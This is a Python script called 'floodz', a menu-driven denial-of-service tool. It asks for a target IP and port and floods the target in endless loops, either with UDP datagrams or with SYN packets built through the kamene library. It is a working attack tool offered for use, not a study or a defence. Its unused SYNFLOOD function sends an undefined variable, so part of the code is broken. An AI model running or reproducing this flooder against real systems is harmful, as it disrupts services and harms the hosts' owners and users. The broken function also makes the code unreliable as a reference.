import socket
import random
import time
import os
from pyfiglet import Figlet
from colorama import Fore
from kamene.all import *
from kamene.layers.inet import IP, TCP
from kamene.volatile import RandShort

def SYNFLOOD(ip_addy, source_port, destination_port):
    source_addr = RandIP()
    destination_ip = ip_addy
    tcp_packet = IP(src=source_addr, dst=destination_ip)/TCP(sport=source_port, dport=destination_port, seq=1505066, flags="S")
    send(packet)
def ddos():
    os.system("clear")
    fig = Figlet(font='slant')
    print(Fore.RED + fig.renderText('floodz'))
    print(" ")
    print(Fore.GREEN + "[1] UDP Flood \n[2] SYN Flooding \n")
    print("\n\n")

    choice = int(input(Fore.RED + "floodz@ddos:~# "))
    
    if choice == 1:    
        print("\n\n")
        # Creating a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Creating Packet
        bytes = random._urandom(1024)
        
        os.system("clear")
        print("\n\n")
        
        # IP and port
        ip = input(Fore.RED + "[*] Target IP: ")
        port = int(input(Fore.RED + "[*] Target Port: "))
        sent = 0
        # Flooding the IP
        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print(Fore.GREEN + "[*] Packet sent")
    elif choice == 2:
        os.system("clear")
        ip2 = input(Fore.RED + "[*] Target IP: ")
        dport = int(input(Fore.RED + "[*] Destination Port: "))
        iplayer = IP(dst=ip2)
        tcplayer = TCP(sport=RandShort(), dport=[dport], seq=RandShort(), ack=1000, window=1000, flags="S")
        packet = iplayer / tcplayer
        while True:
            send(packet)
while True:
    ddos()
